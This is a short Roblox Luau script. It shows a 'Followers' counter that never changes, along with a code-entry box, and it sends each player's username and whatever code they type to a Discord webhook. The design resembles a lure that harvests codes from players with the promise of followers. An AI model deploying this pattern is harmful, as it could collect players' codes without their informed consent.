local Players = game:GetService("Players") local HttpService = game:GetService("HttpService") local webhookUrl = "https://discord.com/api/webhooks/XXXXXXXX/XXXXXXXX" local player = Players.LocalPlayer -- UI local screenGui = Instance.new("ScreenGui") screenGui.Parent = player:WaitForChild("PlayerGui") -- follower label local followersLabel = Instance.new("TextLabel") followersLabel.Size = UDim2.new(0, 200, 0, 50) followersLabel.Position = UDim2.new(0.5, -100, 0.2, 0) followersLabel.TextScaled = true followersLabel.BackgroundColor3 = Color3.fromRGB(30,30,30) followersLabel.TextColor3 = Color3.fromRGB(255,255,255) followersLabel.Text = "Followers: 0" followersLabel.Parent = screenGui -- enter code button local enterButton = Instance.new("TextButton") enterButton.Size = UDim2.new(0, 200, 0, 50) enterButton.Position = UDim2.new(0.5, -100, 0.4, 0) enterButton.TextScaled = true enterButton.BackgroundColor3 = Color3.fromRGB(50,100,200) enterButton.TextColor3 = Color3.fromRGB(255,255,255) enterButton.Text = "Enter Code" enterButton.Parent = screenGui -- input box for code local codeBox = Instance.new("TextBox") codeBox.Size = UDim2.new(0, 200, 0, 50) codeBox.Position = UDim2.new(0.5, -100, 0.5, 0) codeBox.TextScaled = true codeBox.PlaceholderText = "Type code here" codeBox.BackgroundColor3 = Color3.fromRGB(20,20,20) codeBox.TextColor3 = Color3.fromRGB(255,255,255) codeBox.Parent = screenGui -- send code to discord local function sendToDiscord(code) local data = { ["content"] = player.Name .. " entered code: " .. code } local jsonData = HttpService:JSONEncode(data) local success, response = pcall(function() return HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson) end) if success then print("✅ Sent code to Discord!") else warn("❌ Error sending: " .. tostring(response)) end end -- button action enterButton.MouseButton1Click:Connect(function() local code = codeBox.Text if code ~= "" then sendToDiscord(code) codeBox.Text = "" end end)
